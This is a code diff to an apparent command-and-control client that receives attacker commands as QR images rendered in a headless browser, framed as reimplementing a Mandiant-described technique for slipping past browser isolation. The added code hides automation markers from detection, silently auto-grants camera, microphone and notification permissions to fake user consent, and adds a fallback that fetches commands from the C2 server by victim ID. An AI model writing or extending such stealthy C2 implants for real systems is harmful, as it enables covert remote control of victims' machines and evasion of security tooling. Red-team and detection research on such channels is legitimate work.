@@ -126,27 +126,71 @@ class QRDecoder:
             print(f"[!] Auto-register failed: {e}")
 
     def init_headless_browser(self):
+        """
+        Initialize headless Chrome for the QR visual channel.
+
+        Mandiant's QR-C2 technique relies on a real browser rendering
+        the QR PNG as pixels — this is what browser isolation cannot
+        strip. Falls back gracefully if Chrome is unavailable.
+        """
         chrome_options = Options()
-        chrome_options.add_argument("--headless")
+
+        # Stealth / headless
+        chrome_options.add_argument("--headless=new")
         chrome_options.add_argument("--no-sandbox")
         chrome_options.add_argument("--disable-dev-shm-usage")
         chrome_options.add_argument("--disable-gpu")
         chrome_options.add_argument("--window-size=800,600")
+        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
         chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
         chrome_options.add_experimental_option("useAutomationExtension", False)
 
-        self.driver = webdriver.Chrome(options=chrome_options)
-        self.driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
-            "source": "Object.defineProperty(navigator, 'webdriver', { get: () => undefined })"
+        # Camera / mic / notifications — auto-grant (simulates user consent
+        # in isolated browser environments). Without this, some RBI products
+        # block dynamic media access before the QR renders.
+        chrome_options.add_argument("--use-fake-ui-for-media-stream")
+        chrome_options.add_argument("--use-fake-device-for-media-stream")
+        chrome_options.add_experimental_option("prefs", {
+            "profile.default_content_setting_values.media_stream_camera": 1,
+            "profile.default_content_setting_values.media_stream_mic": 1,
+            "profile.default_content_setting_values.notifications": 1,
         })
-        print("[+] Headless browser initialized (stealth mode)")
+
+        try:
+            self.driver = webdriver.Chrome(options=chrome_options)
+            self.driver.execute_cdp_cmd(
+                "Page.addScriptToEvaluateOnNewDocument",
+                {"source": "Object.defineProperty(navigator, 'webdriver', { get: () => undefined })"}
+            )
+            print("[+] Headless Chrome initialized (stealth + media auto-grant)")
+        except Exception as e:
+            print(f"[!] Chrome unavailable: {e}")
+            print("[!] Install Google Chrome: https://www.google.com/chrome/")
+            print("[!] Falling back to requests-based QR fetch (less stealthy)")
+            self.driver = None
 
     def capture_qr_screenshot(self) -> np.ndarray:
+        """
+        Fetch the QR PNG.
+
+        Primary path: Selenium renders it in real Chrome (matches Mandiant
+        technique — visual pixel channel).
+        Fallback path: direct HTTP fetch when Chrome is unavailable.
+        """
         qr_url = f"{self.c2_url}/qr/{self.victim_id}"
-        self.driver.get(qr_url)
-        time.sleep(0.5)
-        screenshot = self.driver.get_screenshot_as_png()
-        img = Image.open(BytesIO(screenshot))
+
+        if self.driver:
+            # Real-browser path
+            self.driver.get(qr_url)
+            time.sleep(0.5)
+            screenshot = self.driver.get_screenshot_as_png()
+            img = Image.open(BytesIO(screenshot))
+            return cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
+
+        # Fallback — direct fetch
+        resp = self.session.get(qr_url, timeout=5)
+        resp.raise_for_status()
+        img = Image.open(BytesIO(resp.content)).convert("RGB")
         return cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
 
     def decode_qr_image(self, image: np.ndarray) -> dict:
@@ -476,7 +520,7 @@ def main():
         print("[*] No victim-id provided, auto-registering...")
         decoder.register_with_c2(hostname=args.hostname)
 
-    decoder.init_headless_browser()
+    decoder.init_headless_browser()  # graceful no-op if Chrome unavailable
 
     try:
         decoder.listen_for_commands(interval=args.interval)
